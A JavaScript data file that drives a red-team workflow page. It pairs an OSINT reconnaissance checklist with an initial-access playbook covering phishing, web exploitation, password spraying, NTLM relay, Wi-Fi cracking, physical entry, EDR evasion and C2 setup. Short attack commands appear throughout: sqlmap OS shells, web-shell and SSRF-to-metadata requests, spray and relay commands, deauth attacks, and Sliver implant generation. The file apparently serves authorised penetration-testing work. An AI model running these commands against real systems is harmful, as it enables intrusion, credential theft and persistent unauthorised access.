/*
  RED TEAM WORKFLOW — data for red-team-workflow.html (rendered by rtwmap-main.js).

  Combines two complementary surfaces:

    recon  (OSINT)          -> a CHECKLIST you tick, organised along the OSINT
                               Framework branches. Coverage is a list, so it ticks.
    access (Initial Access) -> a PLAYBOOK of vectors -> techniques. Each technique
                               has a short note, a command, tool/theory chips,
                               colour-coded outcome badges, and jumpable "on
                               success -> next step" links. Not every method
                               applies, so these are OPTIONS, not checks.

  MODEL
    RTW_MAP = {
      meta: { title, note },
      recon:  { sections:[ {id,title,color,tag,desc, groups:[ {id,title,scenario,
                 items:[ {text,desc,tools:[{n,id?,url?}],vulns:[{n,id?,url?}]} ] } ]} ] },
      access: { sections:[ {id,title,color,tag,desc, techniques:[ {
                 id, title, note,
                 tools:[{n,id?,url?}], theory:{label,url}?, vulns:[{n,id?,url?}],
                 cmd:"..." | cmds:[...],              // # comments dimmed
                 outcomes:[ {label,color} ],          // what you gained (terminal)
                 moveTo:[ {sec,tech?,label,note,color?} | {url,label,note,color?} ]
               } ] } ] }
    }

  moveTo.sec -> another access section id (in-page jump, opens + scrolls).
  moveTo.url -> an external page (ad-map.html, a theory page).
  Edit THIS file for content; never edit rtwmap-main.js.
*/

var RTW_MAP = {
  meta: {
    title: "Red Team Workflow",
    note: "Reconnaissance (OSINT) as a checklist, then Initial Access as a jumpable playbook."
  },

  /* ================================================================== */
  /* PART 1 — RECONNAISSANCE (OSINT) — checklist                         */
  /* ================================================================== */
  recon: {
    sections: [
      {
        id: "r-planning", title: "Planning & Scoping", color: "#22d3ee", tag: "Pre-engagement",
        desc: "Set the objective and scope before collecting anything.",
        groups: [
          { id: "rp-obj", title: "Define the objective", scenario: "the very start — before you collect anything.", items: [
            { text: "Write the recon requirement as a question", desc: "State what the recon feeds (initial-access surface, target users, infrastructure)." },
            { text: "List the selectors you already hold", desc: "Company, domains, brands, names, emails, usernames — your starting pivots." },
            { text: "Set success criteria and a stop condition", desc: "Decide what 'enough' looks like; OSINT expands without limit." },
            { text: "Keep the OSINT Framework open as a decision tree", desc: "Pick the branch that matches the selector in front of you.", tools: [ { n: "OSINT Framework", url: "https://osintframework.com/" } ] }
          ]},
          { id: "rp-scope", title: "Scope & rules of engagement", scenario: "at kickoff — lock down what is in play.", items: [
            { text: "Confirm the target scope and in-scope selectors", desc: "Which domains, brands, netblocks, people and accounts are fair game." },
            { text: "Agree rules of engagement and deconfliction", desc: "Timing, the passive/active boundary, points of contact, reporting." },
            { text: "Keep an audit trail of sources and timestamps", desc: "Backs the report and lets blue team retrace the trail." }
          ]}
        ]
      },
      {
        id: "r-opsec", title: "OPSEC & Managed Attribution", color: "#818cf8", tag: "OpSec",
        desc: "Keep collection from touching the target and keep yourself out of your own data.",
        groups: [
          { id: "ro-infra", title: "Research environment", scenario: "before interacting with any target-controlled surface.", items: [
            { text: "Use a dedicated VM / clean browser profile", desc: "Isolate research from your real identity, cookies and history." },
            { text: "Route through a VPN / non-attributable egress", desc: "Avoid revealing your real IP and employer netblock." },
            { text: "Watch for tracking and view-leaks", desc: "Link shorteners, pixels and 'who viewed' features tip off the target." }
          ]},
          { id: "ro-puppet", title: "Sock puppets", scenario: "when a source needs an account to view.", items: [
            { text: "Build aged, believable research accounts", desc: "Never use real or employer accounts to view a target." },
            { text: "Separate puppets per platform / engagement", desc: "Avoid cross-contamination that links personas." },
            { text: "Mind account-suggestion leaks", desc: "'People you may know' can link personas back to you." }
          ]}
        ]
      },
      {
        id: "r-domain", title: "Domains, DNS & Infrastructure", color: "#38bdf8", tag: "Infra",
        desc: "Map the namespace: registration, DNS, subdomains, certificates.",
        groups: [
          { id: "rd-whois", title: "WHOIS & DNS", scenario: "once you have a domain.", items: [
            { text: "WHOIS / RDAP and reverse-WHOIS for sibling domains", desc: "Registrar, dates, name servers, registrant pivots.", tools: [ { n: "ViewDNS", url: "https://viewdns.info/" } ] },
            { text: "Enumerate DNS records and attempt AXFR", desc: "A/MX/NS/TXT/SOA map hosting, mail and SaaS; a misconfigured NS leaks the zone." },
            { text: "Query passive DNS", desc: "Historical resolutions reveal old IPs and related hostnames.", tools: [ { n: "SecurityTrails", url: "https://securitytrails.com/" } ] }
          ]},
          { id: "rd-subs", title: "Subdomains & certificates", scenario: "to widen the attack surface.", items: [
            { text: "Enumerate subdomains passively", desc: "Aggregate from many passive sources.", tools: [ { n: "amass", id: "amass" }, { n: "subfinder", id: "subfinder" }, { n: "theHarvester", id: "theharvester" } ] },
            { text: "Mine Certificate Transparency logs", desc: "CT logs list hostnames on issued certs.", tools: [ { n: "crt.sh", url: "https://crt.sh/" } ] },
            { text: "Resolve and fingerprint live hosts", desc: "Which subdomains respond and what they run.", tools: [ { n: "whatweb", id: "whatweb" } ] }
          ]}
        ]
      },
      {
        id: "r-assets", title: "Hosts & Internet Assets", color: "#2dd4bf", tag: "Attack surface",
        desc: "Exposed services, netblocks and devices from internet-wide scan data.",
        groups: [
          { id: "ra-scan", title: "Scan engines & ASN", scenario: "to see exposure without scanning the target.", items: [
            { text: "Search the target in device search engines", desc: "Open ports, banners, versions, screenshots, favicons.", tools: [ { n: "Shodan", id: "shodan" }, { n: "Censys", id: "censys" } ] },
            { text: "Map the ASN and netblocks", desc: "Owned ranges expand the asset list.", tools: [ { n: "bgp.he.net", url: "https://bgp.he.net/" } ] },
            { text: "Pivot on favicon / cert / title hashes", desc: "Find other hosts sharing the same asset." }
          ]}
        ]
      },
      {
        id: "r-people", title: "People, Email & Usernames", color: "#fb7185", tag: "HUMINT",
        desc: "Build the people picture — names, addresses, handles, breaches.",
        groups: [
          { id: "rpe-org", title: "Org & people", scenario: "to build the org chart and email format.", items: [
            { text: "Harvest employees, roles and email format", desc: "Org chart + first.last@ pattern drive phishing and spraying.", tools: [ { n: "theHarvester", id: "theharvester" }, { n: "Hunter.io", url: "https://hunter.io/" } ] },
            { text: "Mine job postings and public records", desc: "Vacancies leak the tech stack; registries confirm the entity.", tools: [ { n: "OpenCorporates", url: "https://opencorporates.com/" } ] }
          ]},
          { id: "rpe-id", title: "Usernames, email & breaches", scenario: "with a handle, email or name in hand.", items: [
            { text: "Enumerate usernames across platforms", desc: "A reused handle links accounts everywhere.", tools: [ { n: "Sherlock", id: "sherlock" }, { n: "Maigret", id: "maigret" } ] },
            { text: "Check email registration and breaches", desc: "Which services a person uses, and exposed passwords.", tools: [ { n: "Holehe", id: "holehe" }, { n: "Have I Been Pwned", url: "https://haveibeenpwned.com/" }, { n: "Dehashed", url: "https://dehashed.com/" } ] }
          ]}
        ]
      },
      {
        id: "r-content", title: "Web, Code, Cloud & Metadata", color: "#a3e635", tag: "Exposure",
        desc: "What the target's web, repos, cloud and documents inadvertently expose.",
        groups: [
          { id: "rc-web", title: "Web, archives & dorking", scenario: "when you have sites or want their history.", items: [
            { text: "Fingerprint the stack and crawl content", desc: "CMS, analytics IDs, hidden paths, APIs.", tools: [ { n: "whatweb", id: "whatweb" }, { n: "katana", id: "katana" } ] },
            { text: "Pull archives and dork for exposed files", desc: "Deleted pages, configs, backups, panels.", tools: [ { n: "Wayback Machine", url: "https://web.archive.org/" }, { n: "Google Hacking DB", url: "https://www.exploit-db.com/google-hacking-database" } ] }
          ]},
          { id: "rc-secrets", title: "Code, cloud & docs", scenario: "to find secrets and internal detail.", items: [
            { text: "Enumerate repos and scan for secrets", desc: "Keys and tokens in code and git history.", tools: [ { n: "GitHub search", url: "https://github.com/search" }, { n: "trufflehog" } ] },
            { text: "Enumerate public cloud storage", desc: "Open buckets/blobs guessed from naming.", tools: [ { n: "cloud_enum" } ] },
            { text: "Harvest document metadata", desc: "Authors, software, internal paths from public files.", tools: [ { n: "ExifTool", id: "exiftool" }, { n: "metagoofil" } ] }
          ]}
        ]
      }
    ]
  },

  /* ================================================================== */
  /* PART 2 — INITIAL ACCESS — playbook (jumpable)                       */
  /* ================================================================== */
  access: {
    sections: [
      {
        id: "phishing", title: "Phishing & Social Engineering", color: "#fb7185", tag: "T1566",
        desc: "Get a human to run code or give up credentials — the most common real-world entry.",
        techniques: [
          { id: "ph-attach", title: "Spearphishing attachment", note: "Deliver a lure document or container that runs a loader when opened. Pretext tuned from recon; sender domain SPF/DKIM/DMARC-aligned.",
            tools: [ { n: "GoPhish", id: "gophish" } ],
            outcomes: [ { label: "Payload executes", color: "#5eead4" } ],
            moveTo: [ { sec: "delivery", label: "Payload Delivery & Evasion", note: "get the loader to run and survive AV/EDR" } ] },
          { id: "ph-link", title: "Spearphishing link (credential harvest)", note: "Cloned login page captures the password; pretext as a shared doc, reset or portal notice.",
            tools: [ { n: "GoPhish", id: "gophish" } ],
            outcomes: [ { label: "Credentials", color: "#fbbf24" } ],
            moveTo: [ { sec: "creds", label: "Validate & spray", note: "confirm the creds and see what they unlock" }, { sec: "remote", label: "External Remote Services", note: "log the creds into VPN / webmail / RDP" } ] },
          { id: "ph-aitm", title: "Adversary-in-the-middle (reverse proxy)", note: "Relay the real login so the user completes MFA through you, then steal the authenticated session cookie.",
            tools: [ { n: "Evilginx", url: "https://github.com/kgretzky/evilginx2" } ],
            outcomes: [ { label: "Session cookie (MFA bypassed)", color: "#93c5fd" } ],
            moveTo: [ { sec: "cloud", label: "Token / session replay", note: "import the cookie to ride the session" } ] },
          { id: "ph-consent", title: "OAuth / device-code phishing", note: "Trick the user into consenting to a malicious app or authorising your device, yielding tokens that survive MFA.",
            outcomes: [ { label: "OAuth tokens", color: "#93c5fd" } ],
            moveTo: [ { sec: "cloud", label: "Cloud & SaaS Entry", note: "use the tokens against the tenant" } ] },
          { id: "ph-mfa", title: "MFA fatigue / push bombing", note: "With a valid password, spam push prompts (optionally with an IT pretext) until the user approves one.",
            outcomes: [ { label: "Authenticated session", color: "#fbbf24" } ],
            moveTo: [ { sec: "remote", label: "External Remote Services", note: "complete sign-in to the portal" } ] }
        ]
      },
      {
        id: "web", title: "Public-Facing Web Applications", color: "#38bdf8", tag: "T1190",
        desc: "Exploit an internet-facing app or appliance to run code or reach internal systems.",
        techniques: [
          { id: "web-fp", title: "Fingerprint & scan", note: "Identify product/version, discover content, and scan for known CVEs to pick an exploit path.",
            tools: [ { n: "whatweb", id: "whatweb" }, { n: "nuclei", id: "nuclei" }, { n: "ffuf", id: "ffuf" }, { n: "Burp", id: "burpsuite" } ],
            cmds: [ "whatweb https://<target>", "nuclei -u https://<target>", "ffuf -u https://<target>/FUZZ -w common.txt" ],
            outcomes: [ { label: "Confirmed weakness", color: "#86efac" } ],
            moveTo: [ { sec: "web", tech: "web-sqli", label: "Exploit the weakness", note: "pick the matching technique below" } ] },
          { id: "web-sqli", title: "SQL injection → data / RCE", note: "Dump credentials, or escalate to stacked queries / xp_cmdshell / INTO OUTFILE for a shell.",
            tools: [ { n: "sqlmap", id: "sqlmap" } ], vulns: [ { n: "SQL Injection", id: "sqli" } ],
            cmds: [ "sqlmap -u \"https://<target>/item?id=1\" --batch --dbs", "sqlmap -u \"https://<target>/item?id=1\" --os-shell" ],
            outcomes: [ { label: "Code execution", color: "#5eead4" }, { label: "DB credentials", color: "#fbbf24" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "turn code exec into C2" }, { sec: "creds", label: "Validate credentials", note: "reuse dumped creds elsewhere" } ] },
          { id: "web-upload", title: "File upload → web shell", note: "Bypass validation and upload an executable handler to a web-served path, then browse to it.",
            vulns: [ { n: "File Upload", id: "file-upload" } ],
            cmds: [ "# upload shell.php (bypass ext / content-type / magic bytes)", "curl \"https://<target>/uploads/shell.php?cmd=id\"" ],
            outcomes: [ { label: "Code execution", color: "#5eead4" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "drop a beacon from the web shell" } ] },
          { id: "web-deser", title: "Insecure deserialization → RCE", note: "Feed a gadget-chain payload to a sink that deserializes attacker input.",
            vulns: [ { n: "Deserialization", id: "insecure-deserialization" } ],
            cmds: [ "# ysoserial <gadget> '<cmd>'  ->  send to the deserialization sink" ],
            outcomes: [ { label: "Code execution", color: "#5eead4" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "callback from the exploited process" } ] },
          { id: "web-inject", title: "Template / command injection", note: "SSTI and OS command injection break straight to a shell as the app user.",
            vulns: [ { n: "SSTI", id: "ssti" }, { n: "Command Injection", id: "command-injection" } ],
            cmds: [ "# confirm: {{7*7}} / ${7*7}", "# escalate: ${T(java.lang.Runtime)...} or ; id" ],
            outcomes: [ { label: "Code execution", color: "#5eead4" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "beacon from the shell" } ] },
          { id: "web-ssrf", title: "SSRF → cloud metadata", note: "Point a server-side request at the metadata endpoint to steal the instance role's credentials.",
            vulns: [ { n: "SSRF", id: "ssrf" } ],
            cmds: [ "curl \"https://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"" ],
            outcomes: [ { label: "Cloud credentials", color: "#93c5fd" } ],
            moveTo: [ { sec: "cloud", label: "Cloud & SaaS Entry", note: "use the role creds against the cloud API" } ] },
          { id: "web-authbypass", title: "Auth bypass / default creds / exposed source", note: "Weak or default auth on panels and appliances, or leaked repos/backups handing over creds and code.",
            vulns: [ { n: "Auth Bypass", id: "auth-bypass" }, { n: "Default Credentials", id: "default-credentials" }, { n: "Exposed Source", id: "exposed-source-backups" } ],
            cmds: [ "# try admin:admin / vendor defaults", "git-dumper https://<target>/.git ./out" ],
            outcomes: [ { label: "Admin of app/appliance", color: "#86efac" }, { label: "Credentials", color: "#fbbf24" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "use the appliance for code exec / pivot" }, { sec: "creds", label: "Reuse credentials", note: "spray recovered creds" } ] }
        ]
      },
      {
        id: "remote", title: "External Remote Services", color: "#2dd4bf", tag: "T1133",
        desc: "Log in to internet-facing remote-access services — VPN, RDP, SSH, Citrix, webmail.",
        techniques: [
          { id: "rm-enum", title: "Enumerate exposed portals", note: "Find VPN, RDP, SSH, Citrix, OWA/Exchange and management interfaces, and flag appliances with pre-auth CVEs.",
            tools: [ { n: "nmap", id: "nmap" }, { n: "nuclei", id: "nuclei" } ], theory: { label: "Perimeter → AD", url: "theory/2026-09-24-perimeter-to-ad.html" },
            cmds: [ "nmap -Pn -sV -p 22,443,3389,5985,1433 <target>" ],
            outcomes: [ { label: "Sprayable portal", color: "#fbbf24" }, { label: "Vulnerable appliance", color: "#86efac" } ],
            moveTo: [ { sec: "remote", tech: "rm-spray", label: "Password spray", note: "spray the portal you found" }, { sec: "foothold", label: "Exploit the edge device", note: "pre-auth chain → foothold" } ] },
          { id: "rm-spray", title: "Password spray the portal", note: "A few common passwords across all users, spaced under the lockout threshold.",
            tools: [ { n: "netexec", id: "netexec" }, { n: "kerbrute", id: "kerbrute" } ],
            cmds: [ "nxc smb <target> -u users.txt -p 'Spring2025!' --continue-on-success", "kerbrute passwordspray -d <domain> users.txt 'Spring2025!'" ],
            outcomes: [ { label: "Valid credentials", color: "#fbbf24" } ],
            moveTo: [ { sec: "creds", label: "Validate & map access", note: "see what the account reaches" } ] },
          { id: "rm-valid", title: "Use valid accounts / breach creds", note: "Reused or leaked credentials logged straight into VPN/RDP/webmail (defeat MFA via AiTM or a stolen cookie).",
            outcomes: [ { label: "Authenticated access", color: "#86efac" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "operate from the remote session" } ] }
        ]
      },
      {
        id: "creds", title: "Valid Accounts & Credentials", color: "#fbbf24", tag: "T1078",
        desc: "The quietest vector — log in with credentials you obtained rather than exploiting anything.",
        techniques: [
          { id: "cr-obtain", title: "Obtain credentials", note: "From breaches/combolists, keys and tokens in public code, or session cookies from AiTM / stealer logs.",
            tools: [ { n: "trufflehog" }, { n: "Dehashed", url: "https://dehashed.com/" } ],
            cmds: [ "trufflehog github --org=<org>" ],
            outcomes: [ { label: "Candidate credentials", color: "#fbbf24" } ],
            moveTo: [ { sec: "creds", tech: "cr-spray", label: "Spray & validate", note: "turn candidates into working access" } ] },
          { id: "cr-spray", title: "Spray & validate carefully", note: "One password across all users, spaced to respect lockout; also try default/vendor creds. Then map what the account unlocks.",
            tools: [ { n: "netexec", id: "netexec" }, { n: "kerbrute", id: "kerbrute" } ], vulns: [ { n: "Default Credentials", id: "default-credentials" } ],
            cmds: [ "nxc smb <target> -u users.txt -p 'Season2025!' --continue-on-success", "nxc <proto> <target> -u <user> -p <pass>   # validate + enumerate" ],
            outcomes: [ { label: "Working account", color: "#86efac" } ],
            moveTo: [ { sec: "remote", label: "Log in to a remote service", note: "VPN / RDP / webmail / portal" }, { sec: "cloud", label: "Cloud & SaaS Entry", note: "if the account is a cloud identity" } ] }
        ]
      },
      {
        id: "network", title: "Network & Adjacent Access", color: "#60a5fa", tag: "On-net",
        desc: "On (or next to) the internal network — via drop box, rogue device or assumed breach — abuse L2/L3 trust.",
        techniques: [
          { id: "nw-onwire", title: "Get on the wire (NAC / VLAN)", note: "Plant a rogue device, bypass NAC/802.1x (MAC spoof, bridge behind a printer/VoIP), or VLAN-hop to reach a segment.",
            outcomes: [ { label: "Internal network access", color: "#60a5fa" } ],
            moveTo: [ { sec: "network", tech: "nw-llmnr", label: "Poison & relay", note: "now hunt credentials on the segment" } ] },
          { id: "nw-llmnr", title: "LLMNR / NBT-NS / mDNS poisoning", note: "Answer broadcast name lookups to capture NetNTLM hashes, then crack or relay them.",
            tools: [ { n: "Responder", id: "responder" } ], vulns: [ { n: "LLMNR/NBT-NS", id: "llmnr-nbtns" } ],
            cmds: [ "responder -I eth0 -wd" ],
            outcomes: [ { label: "NetNTLM hash", color: "#e8912e" } ],
            moveTo: [ { sec: "network", tech: "nw-relay", label: "NTLM relay", note: "relay the captured auth" }, { sec: "creds", label: "Crack offline", note: "recover the plaintext password" } ] },
          { id: "nw-relay", title: "NTLM relay", note: "Relay captured or coerced authentication to SMB/LDAP/AD CS (signing off) for access, a cert, or a new computer account.",
            tools: [ { n: "ntlmrelayx", id: "ntlmrelayx" } ], vulns: [ { n: "NTLM Relay", id: "ntlm-relay-vuln" }, { n: "Coercion", id: "authentication-coercion" } ], theory: { label: "Coercion & Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
            cmds: [ "ntlmrelayx.py -tf targets.txt -smb2support", "# coerce: PetitPotam / Coercer / DFSCoerce -> your relay" ],
            outcomes: [ { label: "Code exec / cert / computer account", color: "#86efac" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "execute on the relayed target" } ] },
          { id: "nw-mitm6", title: "IPv6 DNS takeover (mitm6)", note: "Advertise rogue DHCPv6 + DNS so Windows resolves through you, then relay WPAD/LDAP auth.",
            tools: [ { n: "mitm6", url: "https://github.com/dirkjanm/mitm6" } ],
            cmds: [ "mitm6 -d <domain>", "ntlmrelayx.py -6 -t ldaps://<dc> --delegate-access" ],
            outcomes: [ { label: "Relayed auth / directory rights", color: "#86efac" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "use the delegated/relayed access" } ] }
        ]
      },
      {
        id: "wireless", title: "Wireless Access", color: "#a3e635", tag: "Wi-Fi / RF",
        desc: "Break onto Wi-Fi (or other RF) to reach the internal network or capture credentials.",
        techniques: [
          { id: "wl-psk", title: "WPA2-PSK handshake / PMKID crack", note: "Capture the 4-way handshake (or PMKID), deauth a client if needed, crack offline, then join the network.",
            tools: [ { n: "aircrack-ng", id: "aircrack-ng" }, { n: "hashcat" } ],
            cmds: [ "airodump-ng -c <ch> --bssid <bssid> -w cap wlan0mon", "aireplay-ng --deauth 5 -a <bssid> wlan0mon", "aircrack-ng -w rockyou.txt cap-01.cap" ],
            outcomes: [ { label: "Wi-Fi key → internal network", color: "#60a5fa" } ],
            moveTo: [ { sec: "network", label: "Network & Adjacent Access", note: "you are now on the internal LAN" } ] },
          { id: "wl-eap", title: "WPA2-Enterprise evil twin", note: "Rogue AP + RADIUS captures the 802.1x MSCHAPv2 challenge/response to crack domain credentials.",
            tools: [ { n: "eaphammer", url: "https://github.com/s0lst1c3/eaphammer" } ],
            cmds: [ "eaphammer -i wlan0 --essid <SSID> --creds" ],
            outcomes: [ { label: "Domain credentials", color: "#fbbf24" } ],
            moveTo: [ { sec: "creds", label: "Validate & spray", note: "use the recovered domain creds" } ] },
          { id: "wl-rogue", title: "Rogue AP / Karma / captive portal", note: "Lure clients onto your AP (Karma answers probes) to capture creds or deliver a payload.",
            outcomes: [ { label: "Credentials / client code exec", color: "#5eead4" } ],
            moveTo: [ { sec: "delivery", label: "Payload Delivery", note: "land code on the lured client" } ] },
          { id: "wl-guest", title: "Pivot from guest / IoT Wi-Fi", note: "Weak segmentation between guest and corporate lets you reach internal services.",
            outcomes: [ { label: "Internal network access", color: "#60a5fa" } ],
            moveTo: [ { sec: "network", label: "Network & Adjacent Access", note: "pivot into the corporate segment" } ] }
        ]
      },
      {
        id: "physical", title: "Physical Access & Entry", color: "#f59e0b", tag: "Physical",
        desc: "Get a body (or a device) inside the building and onto the network.",
        techniques: [
          { id: "py-entry", title: "Entry (tailgate / badge / lock / pretext)", note: "Follow staff through controlled doors, clone an RFID badge, bypass the lock, or talk your way in with a role.",
            tools: [ { n: "Proxmark3" }, { n: "Flipper Zero" } ],
            outcomes: [ { label: "Inside the building", color: "#f59e0b" } ],
            moveTo: [ { sec: "physical", tech: "py-dropbox", label: "Plant access on-site", note: "now get onto the network" } ] },
          { id: "py-dropbox", title: "Drop box / network implant", note: "Plug a small device into a live LAN port that beacons out for remote access (4G out-of-band ideally).",
            tools: [ { n: "Raspberry Pi / LAN Turtle" } ],
            outcomes: [ { label: "Internal foothold (beacon)", color: "#cbd5e1" } ],
            moveTo: [ { sec: "network", label: "Network & Adjacent Access", note: "operate the LAN through the implant" } ] },
          { id: "py-badusb", title: "BadUSB / HID injection", note: "A USB device that types a payload into an unlocked / logged-in workstation.",
            tools: [ { n: "Rubber Ducky / Flipper Zero" } ],
            outcomes: [ { label: "Code execution on host", color: "#5eead4" } ],
            moveTo: [ { sec: "delivery", label: "Payload Delivery & Evasion", note: "run the loader, evade EDR" } ] },
          { id: "py-workstation", title: "Unattended workstation / boot attack", note: "Use a logged-in session or boot from media / a bypass tool on an unencrypted machine.",
            tools: [ { n: "Kon-Boot" } ],
            outcomes: [ { label: "Local access", color: "#86efac" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "plant persistent access" } ] }
        ]
      },
      {
        id: "removable", title: "Removable Media & Hardware", color: "#c084fc", tag: "T1091 / T1200",
        desc: "Deliver access through physical media or planted hardware, often without entering yourself.",
        techniques: [
          { id: "rv-usb", title: "USB drop", note: "Branded USB keys with an HID payload or document lure, scattered where staff will plug them in.",
            outcomes: [ { label: "Code execution on host", color: "#5eead4" } ],
            moveTo: [ { sec: "delivery", label: "Payload Delivery & Evasion", note: "the loader runs — get it to survive" } ] },
          { id: "rv-cable", title: "Malicious cable / peripheral", note: "An implanted cable or adapter that acts as a keyboard or NIC on connection.",
            tools: [ { n: "O.MG Cable" } ],
            outcomes: [ { label: "Injected code / network path", color: "#5eead4" } ],
            moveTo: [ { sec: "delivery", label: "Payload Delivery & Evasion", note: "land and stabilise the payload" } ] },
          { id: "rv-mail", title: "Mailed hardware implant", note: "Post a keylogger, rogue AP or 4G drop box to a target site addressed to a plausible recipient.",
            outcomes: [ { label: "Beacon from inside", color: "#cbd5e1" } ],
            moveTo: [ { sec: "network", label: "Network & Adjacent Access", note: "operate once it is connected" } ] }
        ]
      },
      {
        id: "supplychain", title: "Supply Chain & Trusted Relationship", color: "#f472b6", tag: "T1195 / T1199",
        desc: "Enter through a third party, vendor or dependency the target already trusts.",
        techniques: [
          { id: "sc-software", title: "Software / update / package poisoning", note: "Trojan a signed update, or publish a typosquatted / poisoned dependency the target builds against.",
            outcomes: [ { label: "Code exec inside target", color: "#5eead4" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "callback from the trusted artifact" } ] },
          { id: "sc-trust", title: "Trusted relationship (MSP / B2B)", note: "Abuse a provider's broad remote access, a B2B VPN/federation trust, or shared contractor credentials.",
            outcomes: [ { label: "Access via the trusted party", color: "#86efac" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "operate from the partner channel" } ] }
        ]
      },
      {
        id: "driveby", title: "Drive-by & Watering Hole", color: "#e879f9", tag: "T1189",
        desc: "Compromise the user through the browser, on sites or ads they already use.",
        techniques: [
          { id: "db-water", title: "Watering hole / malvertising / browser exploit", note: "Compromise a site staff visit, buy targeted ads, or exploit an out-of-date browser on visit.",
            outcomes: [ { label: "Code execution in browser", color: "#5eead4" } ],
            moveTo: [ { sec: "delivery", label: "Payload Delivery & Evasion", note: "escape the browser, stabilise" } ] },
          { id: "db-smuggle", title: "HTML smuggling delivery", note: "Assemble the payload client-side from benign content so it is offered by the user's own browser, past gateways.",
            outcomes: [ { label: "File delivered locally", color: "#5eead4" } ],
            moveTo: [ { sec: "delivery", label: "Payload Delivery & Evasion", note: "user runs it — get it executing" } ] }
        ]
      },
      {
        id: "cloud", title: "Cloud & SaaS Entry", color: "#93c5fd", tag: "Cloud",
        desc: "Identity and misconfiguration are the new perimeter — get into the tenant, not the datacentre.",
        techniques: [
          { id: "cl-keys", title: "Leaked cloud keys → console / API", note: "Access keys from repos, laptops or SSRF-to-metadata used against the provider API; enumerate and pivot.",
            cmds: [ "aws sts get-caller-identity", "aws s3 ls   # then enumerate the identity's permissions" ],
            outcomes: [ { label: "Cloud access", color: "#93c5fd" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "pivot to compute / secrets" } ] },
          { id: "cl-consent", title: "OAuth consent / SSO federation abuse", note: "A consented malicious app, a forged/stolen token, or a federation misconfig gives token-based, MFA-surviving access.",
            outcomes: [ { label: "Tenant access (token)", color: "#93c5fd" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "operate within the tenant" } ] },
          { id: "cl-replay", title: "Token / session replay", note: "Replay a stolen session cookie or refresh token to the cloud / SaaS endpoint to skip login.",
            outcomes: [ { label: "Authenticated session", color: "#93c5fd" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "act before the token expires" } ] }
        ]
      },
      {
        id: "delivery", title: "Payload Delivery & Evasion", color: "#5eead4", tag: "Execution",
        desc: "The cross-cutting step — once a vector lands your file or command, get it to run and survive the endpoint.",
        techniques: [
          { id: "dl-run", title: "Delivery & execution primitives", note: "Container files (ISO/IMG/VHD) to strip Mark-of-the-Web, LNK/HTA/scriptlets, macros, HTML smuggling, and signed LOLBins to launch the loader.",
            vulns: [ { n: "AppLocker & WDAC Bypass", url: "theory/2026-10-08-applocker-bypass.html" } ],
            outcomes: [ { label: "Loader runs", color: "#5eead4" } ],
            moveTo: [ { sec: "delivery", tech: "dl-evade", label: "Evade the endpoint", note: "survive AV/EDR, AMSI and logging" } ] },
          { id: "dl-evade", title: "Evade the endpoint (AMSI / ETW / EDR)", note: "Silence in-process AMSI and ETW, unhook userland, run in memory and obfuscate the loader and its C2.",
            vulns: [ { n: "AMSI & ETW Bypass", url: "theory/2026-10-08-amsi-bypass-modern.html" }, { n: "Defense Evasion", url: "theory/2026-09-23-defense-evasion.html" } ],
            outcomes: [ { label: "Loader survives", color: "#5eead4" } ],
            moveTo: [ { sec: "foothold", label: "Establish the foothold", note: "beacon out to C2" } ] }
        ]
      },
      {
        id: "foothold", title: "Establishing the Foothold", color: "#cbd5e1", tag: "C2",
        desc: "Convert execution into stable, controllable access and hand off to the next phase.",
        techniques: [
          { id: "fh-c2", title: "Get a C2 callback / beacon", note: "Establish command and control over a resilient channel (HTTPS/DNS) through a redirector.",
            tools: [ { n: "Sliver", id: "sliver" } ], theory: { label: "Sliver C2", url: "theory/2026-09-23-sliver-c2.html" },
            cmds: [ "sliver > generate --http <c2-domain> --save /tmp/imp", "sliver > http   # start the listener" ],
            outcomes: [ { label: "Interactive session", color: "#cbd5e1" } ],
            moveTo: [ { sec: "foothold", tech: "fh-sa", label: "Situational awareness", note: "orient before moving" } ] },
          { id: "fh-sa", title: "Situational awareness & stabilise", note: "Identify user, host, privileges, domain and defences; migrate/duplicate the session and add low-noise persistence.",
            cmds: [ "whoami /all", "nxc smb <subnet>   # map reachable hosts (through the beacon)" ],
            outcomes: [ { label: "Stable foothold", color: "#cbd5e1" } ],
            moveTo: [ { sec: "foothold", tech: "fh-handoff", label: "Hand off to privesc / AD", note: "escalate and enter the domain" } ] },
          { id: "fh-handoff", title: "Hand off to privilege escalation / AD", note: "Assess local privesc, escalate to admin/SYSTEM, harvest credentials, and enter the Active Directory attack path.",
            theory: { label: "Perimeter → AD", url: "theory/2026-09-24-perimeter-to-ad.html" },
            outcomes: [ { label: "Local admin / SYSTEM", color: "#f4b6b6" } ],
            moveTo: [ { url: "ad-map.html", label: "AD Attack-Path Explorer", note: "continue into the domain", color: "#cdc7e6" } ] }
        ]
      }
    ]
  }
};
